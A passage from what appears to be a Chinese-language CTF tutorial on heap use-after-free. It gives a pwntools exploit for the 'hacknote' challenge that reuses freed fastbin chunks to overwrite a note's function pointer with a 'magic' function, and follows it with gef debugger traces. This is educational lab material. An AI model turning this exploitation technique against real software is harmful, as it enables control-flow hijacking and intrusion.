class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>我们可以具体看一下执行的流程，首先先下断点</p><p><strong>两处 malloc 下断点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x0804875C</span><br><span class="line">Breakpoint 1 at 0x804875c</span><br><span class="line">gef➤  b *0x080486CA</span><br><span class="line">Breakpoint 2 at 0x80486ca</span><br></pre></td></tr></table></figure><p><strong>两处 free 下断点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x08048893</span><br><span class="line">Breakpoint 3 at 0x8048893</span><br><span class="line">gef➤  b *0x080488A9</span><br><span class="line">Breakpoint 4 at 0x80488a9</span><br></pre></td></tr></table></figure><p>然后继续执行程序，可以看出申请 note0 时，所申请到的内存块地址为 0x0804b008。（eax 存储函数返回值）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x0804b008  →  0x00000000</span><br><span class="line">$ebx   : 0x00000000</span><br><span class="line">$ecx   : 0xf7fac780  →  0x00000000</span><br><span class="line">$edx   : 0x0804b008  →  0x00000000</span><br><span class="line">$esp   : 0xffffcf10  →  0x00000008</span><br><span class="line">$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000</span><br><span class="line">$esi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$eip   : 0x080486cf  →  &lt;add_note+89&gt; add esp, 0x10</span><br><span class="line">$cs    : 0x00000023</span><br><span class="line">$ss    : 0x0000002b</span><br><span class="line">$ds    : 0x0000002b</span><br><span class="line">$es    : 0x0000002b</span><br><span class="line">$fs    : 0x00000000</span><br><span class="line">$gs    : 0x00000063</span><br><span class="line">$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">    0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax</span><br><span class="line">    0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al</span><br><span class="line">    0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line"> →  0x80486cf &lt;add_note+89&gt;    add    esp, 0x10</span><br><span class="line">    0x80486d2 &lt;add_note+92&gt;    mov    edx, eax</span><br><span class="line">    0x80486d4 &lt;add_note+94&gt;    mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x80486d7 &lt;add_note+97&gt;    mov    DWORD PTR [eax*4+0x804a070], edx</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffcf10&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffcf10│+0x00: 0x00000008     ← $esp</span><br><span class="line">0xffffcf14│+0x04: 0x00000000</span><br><span class="line">0xffffcf18│+0x08: 0xf7e29ef5  →  &lt;strtol+5&gt; add eax, 0x18210b</span><br><span class="line">0xffffcf1c│+0x0c: 0xf7e27260  →  &lt;atoi+16&gt; add esp, 0x1c</span><br><span class="line">0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000</span><br><span class="line">0xffffcf24│+0x14: 0x00000000</span><br><span class="line">0xffffcf28│+0x18: 0x0000000a</span><br><span class="line">0xffffcf2c│+0x1c: 0x00000000</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</span><br><span class="line">[#0] 0x80486cf → Name: add_note()</span><br><span class="line">[#1] 0x8048ac5 → Name: main()</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  heap chunk 0x0804b008</span><br><span class="line">UsedChunk(addr&#x3D;0x804b008, size&#x3D;0x10)</span><br><span class="line">Chunk size: 16 (0x10)</span><br><span class="line">Usable size: 12 (0xc)</span><br><span class="line">Previous chunk size: 0 (0x0)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure><p><strong>申请 note 0 的 content 的地址为 0x0804b018</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x0804b018  →  0x00000000</span><br><span class="line">$ebx   : 0x0804b008  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp</span><br><span class="line">$ecx   : 0xf7fac780  →  0x00000000</span><br><span class="line">$edx   : 0x0804b018  →  0x00000000</span><br><span class="line">$esp   : 0xffffcf10  →  0x00000020</span><br><span class="line">$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000</span><br><span class="line">$esi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$eip   : 0x08048761  →  &lt;add_note+235&gt; add esp, 0x10</span><br><span class="line">$cs    : 0x00000023</span><br><span class="line">$ss    : 0x0000002b</span><br><span class="line">$ds    : 0x0000002b</span><br><span class="line">$es    : 0x0000002b</span><br><span class="line">$fs    : 0x00000000</span><br><span class="line">$gs    : 0x00000063</span><br><span class="line">$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">    0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804</span><br><span class="line">    0x8048757 &lt;add_note+225&gt;   call   0x581173df</span><br><span class="line">    0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line"> →  0x8048761 &lt;add_note+235&gt;   add    esp, 0x10</span><br><span class="line">    0x8048764 &lt;add_note+238&gt;   mov    DWORD PTR [ebx+0x4], eax</span><br><span class="line">    0x8048767 &lt;add_note+241&gt;   mov    eax, DWORD PTR [ebp-0x1c]</span><br><span class="line">    0x804876a &lt;add_note+244&gt;   mov    eax, DWORD PTR [eax*4+0x804a070]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffcf10&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffcf10│+0x00: 0x00000020     ← $esp</span><br><span class="line">0xffffcf14│+0x04: 0xffffcf34  →  0xf70a3233</span><br><span class="line">0xffffcf18│+0x08: 0x00000008</span><br><span class="line">0xffffcf1c│+0x0c: 0xf7e27260  →  &lt;atoi+16&gt; add esp, 0x1c</span><br><span class="line">0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000</span><br><span class="line">0xffffcf24│+0x14: 0x00000000</span><br><span class="line">0xffffcf28│+0x18: 0x0000000a</span><br><span class="line">0xffffcf2c│+0x1c: 0x00000000</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</span><br><span class="line">[#0] 0x8048761 → Name: add_note()</span><br><span class="line">[#1] 0x8048ac5 → Name: main()</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  heap chunk 0x0804b018</span><br><span class="line">UsedChunk(addr&#x3D;0x804b018, size&#x3D;0x28)</span><br><span class="line">Chunk size: 40 (0x28)</span><br><span class="line">Usable size: 36 (0x24)</span><br><span class="line">Previous chunk size: 0 (0x0)</span><br><span class="line">PREV_INUSE flag: On</span><br><span class="line">IS_MMAPPED flag: Off</span><br><span class="line">NON_MAIN_ARENA flag: Off</span><br></pre></td></tr></table></figure><p>类似的，我们可以得到 note1 的地址以及其 content 的地址分别为 0x0804b040 和 0x0804b050。</p><p>同时，我们还可以看到 note0 与 note1 对应的 content 确实是相应的内存块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  grep aaaa</span><br><span class="line">[+] Searching &#39;aaaa&#39; in memory</span><br><span class="line">[+] In &#39;[heap]&#39;(0x804b000-0x806c000), permission&#x3D;rw-</span><br><span class="line">  0x804b018 - 0x804b01c  →   &quot;aaaa&quot; </span><br><span class="line">gef➤  grep ddaa</span><br><span class="line">[+] Searching &#39;ddaa&#39; in memory</span><br><span class="line">[+] In &#39;[heap]&#39;(0x804b000-0x806c000), permission&#x3D;rw-</span><br><span class="line">  0x804b050 - 0x804b054  →   &quot;ddaa&quot; </span><br></pre></td></tr></table></figure><p>下面就是 free 的过程了。我们可以依次发现首先，note0 的 content 被 free</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> →  0x8048893 &lt;del_note+143&gt;   call   0x80484c0 &lt;free@plt&gt;</span><br><span class="line">   ↳   0x80484c0 &lt;free@plt+0&gt;     jmp    DWORD PTR ds:0x804a018</span><br><span class="line">       0x80484c6 &lt;free@plt+6&gt;     push   0x18</span><br><span class="line">       0x80484cb &lt;free@plt+11&gt;    jmp    0x8048480</span><br><span class="line">       0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp    DWORD PTR ds:0x804a01c</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffcf20&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffcf20│+0x00: 0x0804b018  →  &quot;aaaa&quot;  ← $esp</span><br></pre></td></tr></table></figure><p>然后是 note0 本身</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> →  0x80488a9 &lt;del_note+165&gt;   call   0x80484c0 &lt;free@plt&gt;</span><br><span class="line">   ↳   0x80484c0 &lt;free@plt+0&gt;     jmp    DWORD PTR ds:0x804a018</span><br><span class="line">       0x80484c6 &lt;free@plt+6&gt;     push   0x18</span><br><span class="line">       0x80484cb &lt;free@plt+11&gt;    jmp    0x8048480</span><br><span class="line">       0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp    DWORD PTR ds:0x804a01c</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffcf20&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffcf20│+0x00: 0x0804b008  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp  ← $esp</span><br></pre></td></tr></table></figure><p>当 delete 结束后，我们观看一下 bins，可以发现，确实其被存放在对应的 fast bin 中，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bins</span><br><span class="line">───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────</span><br><span class="line">Fastbins[idx&#x3D;0, size&#x3D;0x8]  ←  UsedChunk(addr&#x3D;0x804b008, size&#x3D;0x10) </span><br><span class="line">Fastbins[idx&#x3D;1, size&#x3D;0xc] 0x00</span><br><span class="line">Fastbins[idx&#x3D;2, size&#x3D;0x10] 0x00</span><br><span class="line">Fastbins[idx&#x3D;3, size&#x3D;0x14]  ←  UsedChunk(addr&#x3D;0x804b018, size&#x3D;0x28) </span><br><span class="line">Fastbins[idx&#x3D;4, size&#x3D;0x18] 0x00</span><br><span class="line">Fastbins[idx&#x3D;5, size&#x3D;0x1c] 0x00</span><br><span class="line">Fastbins[idx&#x3D;6, size&#x3D;0x20] 0x00</span><br></pre></td></tr></table></figure><p>当我们将 note1 也全部删除完毕后，再次观看 bins。可以看出，后删除的 chunk 块确实处于表头。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bins</span><br><span class="line">───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────</span><br><span class="line">Fastbins[idx&#x3D;0, size&#x3D;0x8]  ←  UsedChunk(addr&#x3D;0x804b040, size&#x3D;0x10)  ←  UsedChunk(addr&#x3D;0x804b008, size&#x3D;0x10) </span><br><span class="line">Fastbins[idx&#x3D;1, size&#x3D;0xc] 0x00</span><br><span class="line">Fastbins[idx&#x3D;2, size&#x3D;0x10] 0x00</span><br><span class="line">Fastbins[idx&#x3D;3, size&#x3D;0x14]  ←  UsedChunk(addr&#x3D;0x804b050, size&#x3D;0x28)  ←  UsedChunk(addr&#x3D;0x804b018, size&#x3D;0x28) </span><br><span class="line">Fastbins[idx&#x3D;4, size&#x3D;0x18] 0x00</span><br><span class="line">Fastbins[idx&#x3D;5, size&#x3D;0x1c] 0x00</span><br><span class="line">Fastbins[idx&#x3D;6, size&#x3D;0x20] 0x00</span><br></pre></td></tr></table></figure><p>那么，此时即将要申请 note2，我们可以看下 note2 都申请到了什么内存块，如下</p><p><strong>申请 note2 对应的内存块为 0x804b040，其实就是 note1 对应的内存地址。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b040</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b040</span><br><span class="line">0x080486cf in add_note ()</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$eax   : 0x0804b040  →  0x0804b000  →  0x00000000</span><br><span class="line">$ebx   : 0x00000000</span><br><span class="line">$ecx   : 0xf7fac780  →  0x00000000</span><br><span class="line">$edx   : 0x0804b040  →  0x0804b000  →  0x00000000</span><br><span class="line">$esp   : 0xffffcf10  →  0x00000008</span><br><span class="line">$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000</span><br><span class="line">$esi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$eip   : 0x080486cf  →  &lt;add_note+89&gt; add esp, 0x10</span><br><span class="line">$cs    : 0x00000023</span><br><span class="line">$ss    : 0x0000002b</span><br><span class="line">$ds    : 0x0000002b</span><br><span class="line">$es    : 0x0000002b</span><br><span class="line">$fs    : 0x00000000</span><br><span class="line">$gs    : 0x00000063</span><br><span class="line">$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">    0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax</span><br><span class="line">    0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al</span><br><span class="line">    0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line"> →  0x80486cf &lt;add_note+89&gt;    add    esp, 0x10</span><br></pre></td></tr></table></figure><p><strong>申请 note2 的 content 的内存地址为 0x804b008，就是 note0 对应的地址，即此时我们向 note2 的 content 写内容，就会将 note0 的 put 字段覆盖。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gef➤  n 1</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">0x08048761 in add_note ()</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$eax   : 0x0804b008  →  0x00000000</span><br><span class="line">$ebx   : 0x0804b040  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp</span><br><span class="line">$ecx   : 0xf7fac780  →  0x00000000</span><br><span class="line">$edx   : 0x0804b008  →  0x00000000</span><br><span class="line">$esp   : 0xffffcf10  →  0x00000008</span><br><span class="line">$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000</span><br><span class="line">$esi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$eip   : 0x08048761  →  &lt;add_note+235&gt; add esp, 0x10</span><br><span class="line">$cs    : 0x00000023</span><br><span class="line">$ss    : 0x0000002b</span><br><span class="line">$ds    : 0x0000002b</span><br><span class="line">$es    : 0x0000002b</span><br><span class="line">$fs    : 0x00000000</span><br><span class="line">$gs    : 0x00000063</span><br><span class="line">$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">    0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804</span><br><span class="line">    0x8048757 &lt;add_note+225&gt;   call   0x581173df</span><br><span class="line">    0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line"> →  0x8048761 &lt;add_note+235&gt;   add    esp, 0x10</span><br></pre></td></tr></table></figure><p>我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的 put 指针已经被置为 NULL 了，这是由 fastbin 的 free 机制决定的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;2xw 0x804b008</span><br><span class="line">0x804b008:  0x00000000  0x0804b018</span><br></pre></td></tr></table></figure><p>覆盖后，具体的值如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;2xw 0x804b008</span><br><span class="line">0x804b008:  0x08048986  0x0804b00a</span><br><span class="line">gef➤  x&#x2F;i 0x08048986</span><br><span class="line">   0x8048986 &lt;magic&gt;:   push   ebp</span><br></pre></td></tr></table></figure><p>可以看出，确实已经被覆盖为我们所想要的 magic 函数了。</p><p>最后执行的效果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting local process &#39;.&#x2F;hacknote&#39;: pid 35030</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">flag&#123;use_after_free&#125;----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure><p>同时，我们还可以借助 gef 的 heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap-analysis-helper </span><br><span class="line">[*] This feature is under development, expect bugs and unstability...</span><br><span class="line">[+] Tracking malloc()</span><br><span class="line">[+] Tracking free()</span><br><span class="line">[+] Tracking realloc()</span><br><span class="line">[+] Disabling hardware watchpoints (this may increase the latency)</span><br><span class="line">[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.</span><br><span class="line">[*] Note: The heap analysis slows down noticeably the execution. </span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">[+] Heap-Analysis - malloc(32)&#x3D;0x804b018</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b040</span><br><span class="line">[+] Heap-Analysis - malloc(32)&#x3D;0x804b050</span><br><span class="line">[+] Heap-Analysis - free(0x804b018)</span><br><span class="line">[+] Heap-Analysis - watching 0x804b018</span><br><span class="line">[+] Heap-Analysis - free(0x804b008)</span><br><span class="line">[+] Heap-Analysis - watching 0x804b008</span><br><span class="line">[+] Heap-Analysis - free(0x804b050)</span><br><span class="line">[+] Heap-Analysis - watching 0x804b050</span><br><span class="line">[+] Heap-Analysis - free(0x804b040)</span><br><span class="line">[+] Heap-Analysis - watching 0x804b040</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b040</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">[+] Heap-Analysis - Cleaning up</span><br><span class="line">[+] Heap-Analysis - Re-enabling hardware watchpoints</span><br><span class="line">[New process 36248]</span><br><span class="line">process 36248 is executing new program: &#x2F;bin&#x2F;dash</span><br><span class="line">[New process 36249]</span><br><span class="line">process 36249 is executing new program: &#x2F;bin&#x2F;cat</span><br><span class="line">[Inferior 3 (process 36249) exited normally]</span><br></pre></td></tr></table></figure><p>这里第一个输出了两次，应该是 gef 工具的问题。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="2016-HCTF-fheap"><a href="#2016-HCTF-fheap" class="headerlink" title="2016 HCTF fheap"></a>2016 HCTF fheap</h3><h4 id="基本情况"><a href="#基本情况" class="headerlink" 